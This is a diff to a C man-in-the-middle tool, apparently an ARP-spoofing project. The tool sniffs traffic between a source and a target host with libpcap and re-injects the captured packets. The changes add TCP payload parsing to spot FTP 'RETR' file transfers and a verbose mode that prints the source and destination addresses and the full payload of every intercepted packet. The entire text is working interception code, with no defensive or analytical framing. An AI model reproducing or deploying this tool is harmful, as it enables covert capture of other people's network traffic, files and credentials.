@@ -15,6 +15,7 @@ typedef struct s_vars
 	u_int8_t	*mac_target;
 	u_int8_t	*mac_attacker;
 	libnet_t	*l;
+	int			verbose;
 } t_vars;
 
 pcap_t	*g_handle;
@@ -27,6 +28,7 @@ void 		packet_handler(u_char *args,
 			const struct pcap_pkthdr *packet_header, const u_char *packet_body);
 pcap_t 		*open_device(char *filter_exp);
 void		handle_signal(int signal);
+const u_char	*get_payload(const u_char *packet);
 
 int main(int ac, char **av)
 {
@@ -72,9 +74,9 @@ void	get_args(int ac, char **av, t_vars *vars)
 {
 	int	len;
 
-	if (ac != 5)
+	if ((ac != 5 && ac != 6) || (ac == 6 && strcmp(av[5], "-v")))
 	{
-		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target>\n", 
+		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]\n", 
 				av[0]);
 		exit(0);
 	}
@@ -104,6 +106,8 @@ void	get_args(int ac, char **av, t_vars *vars)
 		free(vars->mac_src);
 		exit(EXIT_FAILURE);
 	}
+	if (ac == 6)	vars->verbose = 1;
+	else			vars->verbose = 0;
 }
 
 u_int8_t	*get_own_mac(libnet_t *l)
@@ -173,10 +177,34 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 	}
 	else
 	{
-		if (ntohs(eth_header->ether_type) == ETHERTYPE_IP
-			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4) // ether + ip + tcp
+		const u_char *payload = get_payload(packet_body);
+		if (payload && !memcmp("RETR", payload, 4)
 			&& memcmp(vars->mac_attacker, eth_header->ether_shost, 6)) // attacker mac != source mac
-			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
+			printf("Transfering: %s\n", payload + 5);
+		if (vars->verbose)
+		{
+			uint32_t src_ip = *(uint32_t *)(packet_body + 14 + 12);
+			uint32_t dst_ip = *(uint32_t *)(packet_body + 14 + 16);
+			int payload_len = packet_header->caplen - (int)(payload - packet_body);
+			printf("%s -> %s - ", libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
+					libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE));
+			for (int i = 0; i < payload_len; i++)
+				printf("%c", payload[i]);
+			printf("\n");
+		}
+		// Resend packet
+		/*
+		if (!memcmp(vars->mac_src, eth_header->ether_shost, 6))
+		{
+			memcpy((void *)(packet_body + 6), packet_body, 6);
+			memcpy((void *)(packet_body), vars->mac_target, 6);
+		}
+		else if (!memcmp(vars->mac_target, eth_header->ether_dhost, 6))
+		{
+			memcpy((void *)(packet_body + 6), packet_body, 6);
+			memcpy((void *)packet_body, vars->mac_src, 6);
+		}
+		*/
 		pcap_inject(g_handle, packet_body, packet_header->caplen);
 	}
 }
@@ -225,4 +253,38 @@ pcap_t *open_device(char *filter_exp)
 void handle_signal(int signal)
 {
 	pcap_breakloop(g_handle);
+}
+
+/*
+ * - Ethernet header is always 14 bytes
+ * - IP header length is always in a 4 byte integer at bit offset 4 of the IP header
+ * - TCP header length is always in a 4 byte int at byte 12 of the TCP header
+ */
+const u_char *get_payload(const u_char *packet)
+{
+	struct ether_header *eth_header;
+	eth_header = (struct ether_header *)packet;
+	if (ntohs(eth_header->ether_type) != ETHERTYPE_IP)
+		return (NULL);
+	
+	const u_char *ip_header;
+	const u_char *tcp_header;
+	const u_char *payload;
+
+	int ip_header_len;
+	int tcp_header_len;
+
+	ip_header = packet + 14; // ethernet_header_len = 14
+	ip_header_len = (*ip_header) & 0x0F;
+	ip_header_len *= 4; // length store in 32-bits-segments
+
+	if (*(ip_header + 9) != IPPROTO_TCP)
+		return (NULL);
+
+	tcp_header = ip_header + ip_header_len;
+	tcp_header_len = ((*(tcp_header + 12)) & 0xF0) >> 4;
+	tcp_header_len *= 4;
+
+	payload = packet + 14 + ip_header_len + tcp_header_len;
+	return (payload);
 }
